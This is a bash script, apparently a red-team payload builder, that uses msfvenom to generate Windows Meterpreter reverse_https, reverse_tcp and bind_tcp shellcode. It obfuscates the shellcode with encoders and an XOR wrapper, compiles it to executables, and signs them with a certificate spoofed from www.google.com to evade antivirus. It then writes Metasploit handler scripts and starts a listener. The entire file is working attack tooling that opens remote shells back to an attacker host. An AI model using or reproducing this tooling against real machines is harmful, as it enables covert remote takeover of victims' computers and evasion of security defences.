#!/bin/bash

export LPORT_DEFAULT=5667

read -p "LHOST [192.168.1.6]: " LHOST; LHOST=${LHOST:-'192.168.1.6'}

function set-port(){
	read -p "LPORT [$LPORT_DEFAULT]: " LPORT; 
	if [ -z $LPORT  ] || [ $LPORT = $LPORT_DEFAULT ]; then
		export LPORT="$LPORT_DEFAULT"
		export LPORT_DEFAULT=`echo "$LPORT_DEFAULT + 1" | bc -q -s`
	fi
	export LPORT=$LPORT
	export LHOST=$LHOST
	echo "Using '$LHOST:$LPORT'"
}

function generate-exe-from-shellcode(){
	file=$1
	python shellcode_encoder.py -cpp -cs -py $file somekey xor && \
	i686-w64-mingw32-g++ ./result/encryptedShellcodeWrapper_xor.cpp -o "$file.exe" -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc && \
	python CarbonCopy.py www.google.com 443 "$file.exe" "$file.cert.exe"
}

mkdir -p result

if [ ! -f result/CERT.pem ]; then
	source generate-certificate.sh
 	generate-certificate
 	mv CERT.pem result/
fi

export LPORT=443
[ -z $STOP  ] && read -p "windows/meterpreter_reverse_https [y/N]: " YESORNO; YESORNO=${YESORNO:-'n'}
[ $YESORNO = 'y' ] && msfvenom -a x86 --platform windows -b '\x00\xff\0x00' \
	-p windows/meterpreter_reverse_https LHOST="$LHOST" LPORT="$LPORT" \
	PayloadUUIDTracking=true HandlerSSLCert="result/CERT.pem" StagerVerifySSLCert=true \
	PayloadUUIDName=ParanoidStagedPSH \
	-f raw -o "result/raw-reverse-tcp-$LHOST-$LPORT.shellcode.txt" && \
	generate-exe-from-shellcode "result/raw-reverse-tcp-$LHOST-$LPORT.shellcode.txt" && \
tee -a result/start-msf.rc << END
use multi/handler
set payload windows/meterpreter_reverse_https
setg HandlerSSLCert result/CERT.pem
setg StagerVerifySSLCert true
setg IgnoreUnknownPayloads true
set LHOST $LHOST
set LPORT $LPORT
exploit -j -z
END

#echo "powershell.exe -ExecutionPolicy Bypass -NoExit -File reverse-tcp-$LHOST-$LPORT.ps1"

[ -z $STOP  ] && read -p "windows/meterpreter/reverse_tcp [y/N]: " YESORNO; YESORNO=${YESORNO:-'n'}
[ $YESORNO = 'y' ] && set-port && msfvenom -a x86 --platform windows -b '\x00\xff\0x00' \
	-p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
	PayloadUUIDTracking=true HandlerSSLCert="result/CERT.pem" StagerVerifySSLCert=true \
	PayloadUUIDName=ParanoidStagedPSH \
	-e x86/shikata_ga_nai -i 5 \
	-f csharp -o "result/csharp-reverse-tcp-$LHOST-$LPORT.shellcode.txt" && \
	msfvenom -a x86 --platform windows -b '\x00\xff\0x00' \
	-p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
	PayloadUUIDTracking=true HandlerSSLCert="result/CERT.pem" StagerVerifySSLCert=true \
	PayloadUUIDName=ParanoidStagedPSH \
	-e x86/shikata_ga_nai -i 5 \
	-f raw -o "result/raw-reverse-tcp-$LHOST-$LPORT.shellcode.txt" && \
	generate-exe-from-shellcode "result/raw-reverse-tcp-$LHOST-$LPORT.shellcode.txt" && \
tee -a result/start-msf.rc << END
use multi/handler
set payload windows/meterpreter/reverse_tcp
setg HandlerSSLCert result/CERT.pem
setg StagerVerifySSLCert true
setg IgnoreUnknownPayloads true
set LHOST $LHOST
set LPORT $LPORT
exploit -j -z
END





[ -z $STOP  ] && read -p "windows/x64/shell/bind_tcp [y/N]: " YESORNO; YESORNO=${YESORNO:-'n'}
[ $YESORNO = 'y' ] && set-port && msfvenom -a x64 --platform windows -b '\x00\xff' \
	-p windows/x64/shell/bind_tcp LPORT="$LPORT" \
	PayloadUUIDTracking=true HandlerSSLCert="result/CERT.pem" StagerVerifySSLCert=true \
	PayloadUUIDName=ParanoidStagedPSH -e x86/alpha_mixed \
	-f csharp -o "result/csharp-x64-shell-bind-$LPORT.shellcode.txt" && \
tee -a result/start-msf.rc << END
use multi/handler
set payload windows/x64/shell/bind_tcp
setg HandlerSSLCert result/CERT.pem
setg StagerVerifySSLCert true
setg IgnoreUnknownPayloads true
set LPORT $LPORT
exploit -j -z
END

## testing
scp result/* afs@192.168.1.136:/Users/afs/

[ -f result/start-msf.rc ] && echo && read -p "Start Listener [yes]: " YESORNO; YESORNO=${YESORNO:-'yes'}
[ $YESORNO = 'yes' ] && msfconsole -r result/start-msf.rc 

